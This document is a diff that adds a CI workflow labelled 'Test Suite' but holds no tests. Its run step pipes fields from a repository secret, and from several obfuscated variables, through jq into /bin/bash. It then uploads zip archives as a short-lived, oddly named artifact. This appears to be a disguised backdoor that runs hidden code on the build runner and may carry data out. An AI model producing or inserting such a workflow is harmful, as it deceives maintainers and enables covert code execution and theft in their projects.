@@ -1,0 +1,30 @@
+name: Test Suite
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run
+        env:
+          wscdi19: ${{ secrets.wscdi19 }}
+        run: |
+          printf '%s' "$wscdi19" | jq -r .d9 | /bin/bash
+          echo $q80 | jq -r .fhvm1 | /bin/bash
+          echo $y68550 | jq -r .rrfwh91089 | /bin/bash
+          printf '%s' "$d5163" | jq -r .cpdt48944 | /bin/bash
+          printf '%s' "$viywl4616" | jq -r .mjbr31023 | /bin/bash
+
+      - name: Save archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: sevEQ4u4
+          path: "*.zip"
+          retention-days: 1
